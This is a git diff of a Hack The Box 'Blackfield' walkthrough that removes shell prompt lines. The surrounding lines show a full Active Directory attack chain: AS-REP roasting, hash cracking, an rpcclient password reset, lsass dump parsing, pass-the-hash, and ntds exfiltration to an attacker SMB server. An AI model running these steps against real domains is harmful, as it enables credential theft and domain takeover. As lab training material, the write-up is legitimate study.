@@ -56,7 +56,6 @@ Checking if there is any share in `smb` service
 **Command**
 I tried `smbmap` only without providing an user and it refused to connect but when using `anonymous` or `guest` it return result.
  ```
-┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
 └─$ smbmap -H 10.10.10.192 -u anonymous 
 ```
 **Result**
@@ -76,7 +75,6 @@ There are to shares which are not default but we only have access to the `profil
 ### Enumerating profiles$
 **Command**
 ```
-┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
 └─$ smbclient -N //10.10.10.192/profiles$ 
 ```
 **List contents**
@@ -95,17 +93,14 @@ smb: \> dir
 ```
 Listing files in this share resulted to some sort of usernames for the machine, hence copy them to the attacking machine and filter only names.
 ```
-┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
 └─$ cat user | awk '{print $1}' > users.txt   
 ```
 This list is too huge but there is a way to fine all valid users, this can done by using the tool known as `kerbrute` and this tool can be found in [kerbrute](https://github.com/ropnop/kerbrute/releases/) and its syntax is shown below
 ```
-┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
 └─$ ./kerbrute userenum --dc 10.10.10.192 -d blackfield.local -o validusers users.txt 
 ```
 This will result into valid users and to clear the names we can use the following command:
 ```
-┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
 └─$ grep VALID  validusers | awk  '{print $7}' | awk -F \@ '{print $1}' > creds/validusers
 ```
 And the result will be 
@@ -117,7 +112,6 @@ support
 ### Checking for 'UF_DONT_REQUIRE_PREAUTH'
 This will require `impacket-GetNPUsers`
 ```
-┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/creds]
 └─$ impacket-GetNPUsers blackfield.local/ -usersfile validusers -dc-ip 10.10.10.192  -no-pass
 ```
 Which results to 
@@ -126,14 +120,12 @@ $krb5asrep$23$support@BLACKFIELD.LOCAL:1108e631d6efac9107984b05d7e87a2c$e96fb3fd
 ```
 **Crack hash**
 ```
-┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/creds]
 └─$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
 ```
 This resulted into `#00^BlackKnight` which is password for the user `support` 
 
 After this i tried `smbclient` and `smbmap` but it wasn't successful then i decided to use `rpcclient` to check if there are other users
 ```
-┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/creds]
 └─$ rpcclient -U "support" 10.10.10.192
 ```
 It connected and to obtain users this command is used
@@ -143,12 +135,10 @@ rpcclient $> enumdomusers
 Non of the new user brings interesting info then we ca continue with another thing 
 ### Collecting Data by using BloodHound
 ```
-┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/bloodhound-data]
 └─$ bloodhound-python -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
 ```
 **Result**
 ```
-┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/bloodhound-data]
 └─$ ls
 20221220160034_computers.json  20221220160034_domains.json  20221220160034_groups.json  20221220160034_users.json  
 ```
@@ -167,7 +157,6 @@ This means that The user `SUPPORT` has the capability to change the user `AUDIT2
 To change the password use the `rpcclient` it is well explained in [malicious.link](https://malicious.link/post/2017/reset-ad-user-password-with-linux/) 
 1. Authenticate to `rpcclient` as user `support`
 ```
-┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
 └─$ rpcclient -U "support" 10.10.10.192  
 Password for [WORKGROUP\support]:
 rpcclient $> 
@@ -178,7 +167,6 @@ rpcclient $> setuserinfo2 Audit2020 23 '@Gemstone'
 ```
 ### Access to Forensic file
 ```
-┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
 └─$ crackmapexec smb 10.10.10.192 -u Audit2020 -p '@Gemstone' --shares
 ```
 **Result**
@@ -198,19 +186,16 @@ SMB         10.10.10.192    445    DC01             SYSVOL          READ        
 ```
 Now we can read the Forensic file
 ```
-┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
 └─$ sudo mount -t cifs -o 'username=audit2020,password=@Gemstone' //10.10.10.192/forensic /mnt
 ```
 The mount way helps to dump everything into attackers machine.
 
 After analyzing the files from the forensic share then found `.zip` file named as `lsass.zip`  it  stands for Local Security Authority Subsystem Service and it is a system process in the Windows operating system that is responsible for enforcing the security policy on the system. Copy the `lsass.zip` into your machine
 ```
-┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/forensic]
 └─$ sudo cp -v /mnt/memory_analysis/lsass.zip .
 ```
 This file has `40M` so after it finishes unzip it to have a `lsass.DMP` to crack this the tool known as `pypykatz` will be used 
 ```
-┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/forensic]
 └─$ pypykatz lsa minidump lsass.DMP > lsass.plain
 ```
 This will provide some potential data including the `NT` for user `Administrator` and `svc_backup` 
@@ -218,7 +203,6 @@ This will provide some potential data including the `NT` for user `Administrator
 ## User Account
 Check with `crackmapexec` to see if you can `pwn` the machine with `winrm` service
 ```
-┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/forensic]
 └─$ crackmapexec winrm 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
 SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
 HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
@@ -226,7 +210,6 @@ WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_bac
 ```
 Then we can login by using `evil-winrm` as user `svc_backup`
 ```
-┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
 └─$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d 
 ```
 **User flag**
@@ -283,7 +266,6 @@ Here are steps to follow
 2. In your Linux machine create a file that will instruct the `diskshadow `to create a copy of the `C: Drive` into a `Z` Drive with `pwn`as its alias but alias can be anything of your choice.
 **Command**
 ```
-┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/exploit]
 └─$ vim pwn.dsh
 ```
 **Contents**
@@ -296,13 +278,11 @@ expose %pwn% z:
 **Convert**
 After creating this `dsh` file, use the `unix2dos` to convert the encoding and spacing of the `dsh` file to the one that is compatible with the Windows Machine
 ```
-┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/exploit]
 └─$ unix2dos pwn.dsh 
 ```
 
 3. Send the `dsh`  file into Windows machine
 ```
-┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/exploit]
 └─$ python3 -m http.server 80
 ```
 **Receive**
@@ -373,7 +353,6 @@ After creating this `dsh` file, use the `unix2dos` to convert the encoding and s
 6. Send `ntds` from Windows machine to Linux machine.
 In Linux machine create a share name mine is  `sec` and path  mine is `.` for more explanation check at [0xdf](https://0xdf.gitlab.io/2018/10/11/pwk-notes-post-exploitation-windows-file-transfers.html)
 ```
-┌──(gemstone㉿hashghost)-[~/…/Machines/vip/blackfield/exploit]
 └─$ impacket-smbserver sec . -smb2support -u  gems -password gems
 ```
 In Windows machine 
@@ -419,7 +398,6 @@ Alternatively you can use `upload` and `download` command to transfer files.
     ```
 We can use Pass-The-Hash again with the admin’s hash, get a shell and read the `root.txt flag`.
 ```
-┌──(gemstone㉿hashghost)-[~/…/htb/Machines/vip/blackfield]
 └─$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee 
 ```
 **Root flag**
